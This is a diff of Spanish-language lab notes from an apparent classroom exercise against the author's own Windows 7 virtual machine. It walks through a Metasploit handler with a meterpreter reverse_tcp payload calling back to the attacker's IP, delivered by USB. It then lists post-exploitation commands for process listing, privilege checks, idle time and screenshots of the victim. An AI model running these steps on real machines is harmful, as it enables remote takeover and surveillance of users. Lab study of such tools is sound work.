@@ -143,13 +143,13 @@ Remote Code Execution Vulnerability."
 Explicación Práctica
 
 1- Abrir Kali y abrir CMD
-2- Instalar una maquina virtual de Windows, no s epuede utilizar windows XP
+2- Instalar una maquina virtual de Windows, no se puede utilizar windows XP
 3- Abrir la maquina virtual que se instaló de Windows
 4- Abrir la consola en kali
 msfconsole
 5- hacer exploit
 use exploit/multi/handler (crear handler para la conexión)
-6- set payload windows/meterpreter/reverse_tcp
+6- set payload windows/x64/meterpreter/reverse_tcp
 7- set LHOST 10.191.4.4(mi ip)
 8- show options (para verificar puerto)
 9- exploit -j
@@ -161,11 +161,27 @@ use exploit/multi/handler (crear handler para la conexión)
 15- exploit (hago exploit y aparecen los archivos)
 16- abro otro cmd para verificar la dirección de los archivos
 17- xdg-open /roor/.msf4/local/
-18- copio los archivos creados en la carpeta compartida
-19- la carpeta compartida también la comparto en windows
-20- verifico si los archivos quedaron en la carpeta compartida
-21- abro un archivo para que empiece la conexión
-
+18- copio los archivos creados en la memoria usb y expulso la memoria de kali
+19- abro la memoria en windows 7
+20- se inicia la sesión
+21- sessions -i 1
+22- procedo a realizar ataque. 
+23- meterpreter>ls
+podemos visualizar los archivos en el directorio remoto actual
+24- meterpreter>ipconfig 
+podemos visualizar toda la información de todas las tarjetas de red existente en la maquina
+25- meterpreter>getprivs
+con getuid podemos consultar el tipo de usuario que la maquina victima está ejecutabdo
+26-meterpreter>ps
+podemos ver los procesos que están en ejecución 
+27- sysinfo
+obtenemos información del sistema:
+nombre maquina, sistema operativo, tipo de arquitectura
+28- meterpreter>idletime
+permite consultar el tiempo en el que el usuario de la maquina victima ha estado ausente
+29- meterpreter>screenshot
+extraemos una imagen de la maquina victima 
+se comparan la imagenes y se puede notar que hizo captura de la pantalla donde se encontraba el usuario 
 
 
 
